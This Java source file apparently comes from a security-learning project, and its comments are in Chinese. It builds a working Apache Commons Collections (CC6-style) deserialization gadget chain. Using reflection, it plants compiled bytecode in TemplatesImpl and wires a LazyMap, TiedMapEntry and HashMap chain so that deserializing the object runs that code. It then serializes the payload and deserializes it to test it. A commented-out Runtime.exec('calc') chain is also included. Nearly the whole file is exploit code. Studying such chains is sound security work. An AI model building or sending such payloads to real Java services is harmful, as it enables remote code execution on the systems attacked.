package com.drose.CC3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class cc6Templateslmpl {
    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
//                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
//        };
//        //尾部chain
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        //进行TemplatesLmpl替换
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();

        //赋值_name不为null
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "Dr0se");

        //赋值_bytecodes二维数组为恶意代码
        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("D://java_project//sec-learning//CC//target//classes//com//drose//CC3//Calc.class"));
        byte[][] codes = {evil};
        bytecodesField.set(templates, codes);

        //赋值_tfactory 为TransformerFactoryImpl 也就是不为null。
        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());


//        templates.newTransformer();

        //想办法获取一个transformer

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap hashMap = new HashMap();
//        Map lazymap = LazyMap.decorate(hashMap, chainedTransformer);
        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));
//        lazymap.get("Dr0se");
        //需要继续分析哪里有get()函数的调用。
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"1");
//        tiedMapEntry.hashCode();
        HashMap<Object,Object> hashMap2 = new HashMap();
        hashMap2.put(tiedMapEntry,"Dr0se");

        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factoryField = lazyMapClass.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazymap,chainedTransformer);
        lazymap.remove("1");
        serialize(hashMap2);
        unserialize("test.txt");
    }
    //序列化反序列化
    public static void serialize(Object obj) throws IOException, FileNotFoundException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("./test.txt"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

